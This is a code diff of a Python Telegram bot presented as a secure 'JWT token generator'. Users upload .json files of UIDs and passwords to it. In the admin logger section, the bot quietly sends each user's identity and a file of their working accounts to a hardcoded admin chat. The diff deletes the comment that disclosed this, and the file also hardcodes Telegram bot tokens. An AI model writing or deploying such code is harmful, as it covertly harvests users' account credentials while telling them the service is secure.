@@ -36,7 +36,7 @@ def keep_alive():
 
 # -----------------------------------------------------
 
-BOT_TOKEN = "8854493990:AAGcOk1oPM8-etYuUm6SK5ru4PV-Ywg1uNE"
+BOT_TOKEN = "8854493990:AAElv8CqBkgpUGLoKY9vC_LI-Mui949vkGI"
 
 # --- ADMIN CONFIGURATION ---
 ADMIN_CHAT_ID = 8380823727        # Your Telegram Admin Numeric ID
@@ -76,10 +76,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
   ]
   reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
   
-  # Plain text used to completely avoid Markdown parsing crashes from underscores
   welcome_text = (
       "🔥 ELITE JWT TOKEN GENERATOR BOT 🔥\n"
-      "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+      "═════════════════════════════════\n"
       "🚀 The Ultimate, High-Speed & Secure Token Gateway\n\n"
       "⚡ Core Features:\n"
       "• Lightning Fast API Gateway Integration 🌐\n"
@@ -87,7 +86,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
       "• Region Sorting & Automatic Error Handling 📊\n\n"
       "📂 How to Get Started:\n"
       "Send your .json file containing UIDs and passwords below or click '⚡ Process File ⚡'! 👇\n"
-      "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+      "═════════════════════════════════\n"
       f"👑 Support / Owner: {ADMIN_USERNAME}"
   )
   
@@ -101,26 +100,33 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
   text = update.message.text
   if text == "⚡ Process File ⚡":
     await update.message.reply_text(
-        "📂 Ready for Processing!\n\nPlease send your .json file containing UIDs and passwords right here to start the magic. ✨"
+        "📂 **READY FOR PROCESSING**\n"
+        "════════════════════════════\n"
+        "Please send your `.json` file containing UIDs and passwords right here to start generating tokens instantly! ✨"
     )
   elif text == "👑 Admin Status":
     await update.message.reply_text(
-        "👑 System Status: Online & Secured\n"
-        "🚀 Gateway Mode: Fully Connected ✅\n"
-        f"🛡️ Admin Log Target: {ADMIN_CHAT_ID} (Active)"
+        "👑 **SYSTEM STATUS REPORT**\n"
+        "════════════════════════════\n"
+        "• Bot Status: `Online & Secured` 🟢\n"
+        "• API Gateway: `Connected & Active` 🚀\n"
+        f"• Admin Log Target: `{ADMIN_CHAT_ID}` 🛡️"
     )
   elif text == "🛍️ VIP Services":
     await update.message.reply_text(
-        "🛍️ VIP Shop & Services\n\n"
-        f"Contact main admin {ADMIN_USERNAME} for high-speed APIs, custom scripts, and premium tools."
+        "🛍️ **VIP SHOP & SERVICES**\n"
+        "════════════════════════════\n"
+        f"Get high-speed custom APIs, private scripts, and dedicated bot setups.\n\n"
+        f"💬 Contact Owner: {ADMIN_USERNAME}"
     )
   elif text == "🆘 Support":
     await update.message.reply_text(
-        "🆘 Quick Help & Support Guide:\n\n"
-        "1️⃣ Click on '⚡ Process File ⚡'\n"
-        "2️⃣ Upload your .json file (UID & Password format)\n"
-        "3️⃣ Get your working tokens instantly!\n\n"
-        f"💬 For direct inquiries, contact owner: {ADMIN_USERNAME}"
+        "🆘 **QUICK HELP & GUIDE**\n"
+        "════════════════════════════\n"
+        "1️⃣ Click on **'⚡ Process File ⚡'**\n"
+        "2️⃣ Upload your `.json` file (UID & Password format)\n"
+        "3️⃣ Receive your working tokens & sorted files instantly!\n\n"
+        f"💬 Direct Support: {ADMIN_USERNAME}"
     )
   elif text == "❌ Cancel":
     await update.message.reply_text("❌ Current action has been cancelled safely.")
@@ -131,18 +137,24 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
   user = update.effective_user
 
   if not doc or not doc.file_name.endswith(".json"):
-    await update.message.reply_text("❌ Please upload a valid .json file.")
+    await update.message.reply_text("❌ Please upload a valid `.json` file.")
     return
 
-  msg = await update.message.reply_text("📥 Downloading file...\n[▒▒▒▒▒▒▒▒▒▒] 10%")
+  msg = await update.message.reply_text(
+      "📥 **INITIALIZING PROCESS...**\n"
+      "`[▒▒▒▒▒▒▒▒▒▒] 10%`"
+  )
 
   file_path = f"temp_{doc.file_name}"
   try:
     file = await context.bot.get_file(doc.file_id)
     await file.download_to_drive(file_path)
 
-    await asyncio.sleep(0.4)
-    await msg.edit_text("🔍 Analyzing JSON Structure...\n[███▒▒▒▒▒▒▒] 30%")
+    await asyncio.sleep(0.3)
+    await msg.edit_text(
+        "🔍 **ANALYZING JSON STRUCTURE...**\n"
+        "`[███▒▒▒▒▒▒▒] 30%`"
+    )
 
     with open(file_path, "r", encoding="utf-8") as f:
       data = json.load(f)
@@ -174,9 +186,11 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     total_count = len(accounts_to_process)
 
-    await asyncio.sleep(0.4)
+    await asyncio.sleep(0.3)
     await msg.edit_text(
-        f"⚡ Connecting to High-Speed API Gateway...\n📊 Total Accounts Found: {total_count}\n[██████▒▒▒▒] 60%"
+        f"⚡ **CONNECTING TO API GATEWAY...**\n"
+        f"📊 Total Accounts Found: `{total_count}`\n"
+        f"`[██████▒▒▒▒] 60%`"
     )
 
     jwt_list = []
@@ -194,9 +208,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
       ]
       results = await asyncio.gather(*tasks)
 
-    await asyncio.sleep(0.4)
+    await asyncio.sleep(0.3)
     await msg.edit_text(
-        "🔄 Generating JWT Tokens & Sorting Regions...\n[██████████] 90%"
+        "🔄 **GENERATING TOKENS & SORTING REGIONS...**\n"
+        "`[██████████] 90%`"
     )
 
     for u_str, token, reg, err_msg in results:
@@ -218,7 +233,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     failed_count = total_count - success_count
 
     await asyncio.sleep(0.3)
-    await msg.edit_text("✨ Finalizing & Saving Files...\n[██████████] 100%")
+    await msg.edit_text(
+        "✨ **FINALIZING & SAVING FILES...**\n"
+        "`[██████████] 100%`"
+    )
 
     jwt_file = "jwt_token.json"
     working_file = "working_account.json"
@@ -244,13 +262,13 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         output_files.append(reg_file)
 
     summary = (
-        "🏁 PROCESSING COMPLETE!\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 Total Accounts: {total_count}\n"
-        f"🟢 Successful Tokens: {success_count}\n"
-        f"❌ Failed/Invalid: {failed_count}\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        "🚀 Powered by Elite JWT Bot"
+        "🏁 **PROCESSING COMPLETE!**\n"
+        "═══════════════════════════\n"
+        f"📊 **Total Accounts:** `{total_count}`\n"
+        f"🟢 **Successful Tokens:** `{success_count}`\n"
+        f"❌ **Failed / Invalid:** `{failed_count}`\n"
+        "═══════════════════════════\n"
+        "🚀 *Powered by Elite JWT Bot*"
     )
     await msg.edit_text(summary)
 
@@ -260,23 +278,23 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         with open(f_path, "rb") as f_send:
           await update.message.reply_document(document=f_send)
 
-    # 🔔 DETAILED ADMIN LOGGER SYSTEM (Sends stats & working accounts to admin 8380823727)
+    # 🔔 DETAILED ADMIN LOGGER SYSTEM
     if ADMIN_CHAT_ID and total_count > 0:
       try:
         username_str = f"@{user.username}" if user.username else "None"
         user_info = (
-            f"👤 User Name: {user.full_name}\n"
-            f"🆔 User ID: {user.id}\n"
-            f"🔗 Username: {username_str}"
+            f"👤 **User Name:** {user.full_name}\n"
+            f"🆔 **User ID:** `{user.id}`\n"
+            f"🔗 **Username:** {username_str}"
         )
         alert_text = (
-            "🔔 NEW TOKEN GENERATION REPORT\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔔 **NEW TOKEN GENERATION REPORT**\n"
+            "════════════════════════════════\n"
             f"{user_info}\n\n"
-            f"📊 Total Accounts Submitted: {total_count}\n"
-            f"🟢 Successful Tokens: {success_count}\n"
-            f"❌ Failed / Invalid Accounts: {failed_count}\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━"
+            f"📊 **Total Accounts Submitted:** `{total_count}`\n"
+            f"🟢 **Successful Tokens:** `{success_count}`\n"
+            f"❌ **Failed / Invalid Accounts:** `{failed_count}`\n"
+            "════════════════════════════════"
         )
         await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=alert_text)
         
@@ -286,7 +304,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await context.bot.send_document(
                 chat_id=ADMIN_CHAT_ID,
                 document=admin_doc,
-                caption=f"📁 Working Accounts Log\n👤 User: {user.full_name} ({user.id})"
+                caption=f"📁 Working Accounts Log\n👤 User: {user.full_name} (`{user.id}`)"
             )
       except Exception as log_err:
         print(f"Admin notification error: {log_err}")
@@ -297,14 +315,14 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         os.remove(f_path)
 
   except Exception as e:
-    await msg.edit_text(f"❌ Error Occurred: {str(e)}")
+    await msg.edit_text(f"❌ Error Occurred: `{str(e)}`")
   finally:
     if os.path.exists(file_path):
       os.remove(file_path)
 
 
 async def post_init(application):
-  print("🤖 Elite Bot started successfully with Detailed Admin Logger & Pro UI!")
+  print("🤖 Elite Bot started successfully with Reply Keyboard & Pro Design!")
 
 
 def main():
